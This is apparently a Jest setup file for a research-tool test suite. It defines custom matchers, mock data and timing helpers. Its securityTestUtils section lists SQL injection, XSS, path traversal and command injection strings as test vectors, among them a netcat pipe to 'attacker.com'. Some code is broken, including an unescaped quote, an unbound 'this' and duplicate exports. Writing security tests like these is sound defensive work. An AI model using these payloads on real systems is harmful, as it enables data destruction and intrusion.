/**
 * Jest Setup and Configuration
 * 
 * Global test setup, utilities, and configuration for OpenCode Tools test suite
 */

import { jest } from '@jest/globals';
import * as path from 'path';

// ====================
// Global Test Configuration
// ====================

// Mock console methods to reduce noise in tests
const originalConsole = { ...console };

beforeAll(() => {
  // Suppress console output during tests unless explicitly enabled
  if (!process.env.VERBOSE_TESTS) {
    global.console = {
      ...console,
      log: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
    };
  }
});

afterAll(() => {
  // Restore console methods
  global.console = originalConsole;
});

// ====================
// Global Test Utilities
// ====================

// Extend Jest matchers
declare global {
  namespace jest {
    interface Matchers<R> {
      toBeValidResearchOutput(): R;
      toBeValidUrl(): R;
      toBeValidEmail(): R;
      toBeValidISODate(): R;
      toBeArrayOfValidSources(): R;
    }
  }
}

// Custom matchers
expect.extend({
  toBeValidResearchOutput(received) {
    const pass = received && 
      typeof received === 'object' &&
      received.dossier &&
      received.sources &&
      received.meta &&
      typeof received.dossier.companySummary === 'string' &&
      Array.isArray(received.sources) &&
      typeof received.meta.runId === 'string';

    if (pass) {
      return {
        message: () => `expected ${received} not to be a valid ResearchOutput`,
        pass: true,
      };
    } else {
      return {
        message: () => `expected ${received} to be a valid ResearchOutput`,
        pass: false,
      };
    }
  },

  toBeValidUrl(received) {
    try {
      new URL(received);
      return {
        message: () => `expected ${received} not to be a valid URL`,
        pass: true,
      };
    } catch {
      return {
        message: () => `expected ${received} to be a valid URL`,
        pass: false,
      };
    }
  },

  toBeValidEmail(received) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const pass = emailRegex.test(received);
    
    if (pass) {
      return {
        message: () => `expected ${received} not to be a valid email`,
        pass: true,
      };
    } else {
      return {
        message: () => `expected ${received} to be a valid email`,
        pass: false,
      };
    }
  },

  toBeValidISODate(received) {
    const isoDateRegex = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/;
    const pass = isoDateRegex.test(received) && !isNaN(Date.parse(received));
    
    if (pass) {
      return {
        message: () => `expected ${received} not to be a valid ISO date`,
        pass: true,
      };
    } else {
      return {
        message: () => `expected ${received} to be a valid ISO date`,
        pass: false,
      };
    }
  },

  toBeArrayOfValidSources(received) {
    if (!Array.isArray(received)) {
      return {
        message: () => `expected ${received} to be an array`,
        pass: false,
      };
    }

    const validSources = received.every(source => 
      source &&
      typeof source.url === 'string' &&
      typeof source.title === 'string' &&
      typeof source.relevance === 'string' &&
      typeof source.accessedAt === 'string'
    );

    if (validSources) {
      return {
        message: () => `expected ${received} not to be an array of valid sources`,
        pass: true,
      };
    } else {
      return {
        message: () => `expected ${received} to be an array of valid sources`,
        pass: false,
      };
    }
  }
});

// ====================
// Global Test Data
// ====================

export const globalTestData = {
  // Common test companies
  companies: {
    techCorp: {
      name: 'TechCorp',
      industry: 'Technology',
      description: 'A leading technology company specializing in innovative solutions',
      size: 'Enterprise',
      location: 'San Francisco, CA'
    },
    startupX: {
      name: 'StartupX',
      industry: 'FinTech',
      description: 'An innovative fintech startup disrupting traditional banking',
      size: 'Startup',
      location: 'Austin, TX'
    },
    healthTech: {
      name: 'HealthTech Solutions',
      industry: 'Healthcare Technology',
      description: 'AI-powered healthcare solutions for improved patient outcomes',
      size: 'Mid-size',
      location: 'Boston, MA'
    }
  },

  // Common test industries
  industries: {
    fintech: {
      name: 'FinTech',
      growth: '15% annually',
      trends: ['Digital payments', 'AI fraud detection', 'Mobile-first', 'RegTech'],
      challenges: ['Regulatory compliance', 'Security threats', 'Legacy systems']
    },
    healthcare: {
      name: 'Healthcare Technology',
      growth: '12% annually',
      trends: ['AI diagnostics', 'Telemedicine', 'Wearable devices', 'Personalized medicine'],
      challenges: ['HIPAA compliance', 'Integration complexity', 'Cost pressures']
    },
    ecommerce: {
      name: 'E-commerce',
      growth: '10% annually',
      trends: ['Mobile commerce', 'AI personalization', 'Social commerce', 'Same-day delivery'],
      challenges: ['Customer acquisition', 'Logistics', 'Returns management']
    }
  },

  // Common technology stacks
  techStacks: {
    modern: {
      frontend: ['React', 'Vue.js', 'Angular', 'Next.js', 'Svelte'],
      backend: ['Node.js', 'Python', 'Go', 'Java', 'Rust'],
      database: ['PostgreSQL', 'MongoDB', 'Redis', 'Elasticsearch'],
      infrastructure: ['AWS', 'Docker', 'Kubernetes', 'Terraform']
    },
    legacy: {
      frontend: ['jQuery', 'AngularJS', 'Backbone.js'],
      backend: ['PHP', 'Ruby', 'Java EE', '.NET Framework'],
      database: ['MySQL', 'Oracle', 'SQL Server'],
      infrastructure: ['On-premise', 'VMware', 'Physical servers']
    }
  }
};

// ====================
// Mock Utilities
// ====================

export const createMockFunctions = {
  // Mock webfetch responses
  webfetch: {
    success: (content: string = 'Mock web content with relevant information') => {
      return jest.fn().mockResolvedValue({
        content,
        url: 'https://example.com',
        success: true,
        timestamp: new Date().toISOString()
      });
    },

    failure: (error: string = 'Service unavailable') => {
      return jest.fn().mockRejectedValue(new Error(error));
    },

    timeout: (delay: number = 5000) => {
      return jest.fn().mockImplementation(() => 
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Request timeout')), delay)
        )
      );
    }
  },

  // Mock file system operations
  filesystem: {
    readSuccess: (content: string) => {
      return jest.fn().mockResolvedValue(content);
    },

    readFailure: (error: string = 'File not found') => {
      return jest.fn().mockRejectedValue(new Error(error));
    },

    writeSuccess: () => {
      return jest.fn().mockResolvedValue(undefined);
    },

    writeFailure: (error: string = 'Permission denied') => {
      return jest.fn().mockRejectedValue(new Error(error));
    }
  }
};

// ====================
// Test Environment Setup
// ====================

export const setupTestEnvironment = () => {
  // Set test environment variables
  process.env.NODE_ENV = 'test';
  process.env.TEST_MODE = 'true';
  process.env.LOG_LEVEL = 'error'; // Reduce log noise during tests

  // Mock Date for consistent timestamps in tests
  const mockDate = new Date('2024-01-01T00:00:00.000Z');
  jest.spyOn(global, 'Date').mockImplementation(() => mockDate);
  
  // Ensure clean state
  jest.clearAllTimers();
  jest.useFakeTimers();
  jest.setSystemTime(mockDate);
};

export const cleanupTestEnvironment = () => {
  // Restore real timers
  jest.useRealTimers();
  
  // Clear all mocks
  jest.clearAllMocks();
  jest.restoreAllMocks();
  
  // Reset environment
  delete process.env.TEST_MODE;
};

// ====================
// Performance Testing Utilities
// ====================

export const performanceUtils = {
  measureExecutionTime: async (fn: () => Promise<any>): Promise<{ result: any; duration: number }> => {
    const start = process.hrtime.bigint();
    const result = await fn();
    const end = process.hrtime.bigint();
    const duration = Number(end - start) / 1_000_000; // Convert to milliseconds
    
    return { result, duration };
  },

  assertPerformance: (duration: number, maxDuration: number = 1000) => {
    expect(duration).toBeLessThan(maxDuration);
  }
};

// ====================
// Security Testing Utilities
// ====================

export const securityTestUtils = {
  // Common attack vectors for testing
  attackVectors: {
    sqlInjection: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --"
    ],
    xss: [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert('XSS')">'
    ],
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd'
    ],
    commandInjection: [
      '; cat /etc/passwd',
      '&& whoami',
      '| nc attacker.com 4444'
    ]
  },

  // Test for common vulnerabilities
  testForVulnerabilities: (input: string, vulnerabilityType: string) => {
    const vectors = this.attackVectors[vulnerabilityType] || [];
    return vectors.some(vector => input.includes(vector));
  }
};

// ====================
// Test Lifecycle Hooks
// ====================

beforeEach(() => {
  // Reset all mocks before each test
  jest.clearAllMocks();
  
  // Setup fresh test environment
  setupTestEnvironment();
});

afterEach(() => {
  // Cleanup after each test
  cleanupTestEnvironment();
});

beforeAll(() => {
  // Global setup for all tests
  console.log('🧪 Setting up OpenCode Tools test environment...');
  setupTestEnvironment();
});

afterAll(() => {
  // Global cleanup for all tests
  console.log('✅ Cleaning up OpenCode Tools test environment...');
  cleanupTestEnvironment();
});

// ====================
// Export Everything
// ====================

export {
  setupTestEnvironment,
  cleanupTestEnvironment,
  createMockFunctions,
  performanceUtils,
  securityTestUtils,
  globalTestData
};

export default {
  setupTestEnvironment,
  cleanupTestEnvironment,
  createMockFunctions,
  performanceUtils,
  securityTestUtils,
  globalTestData
};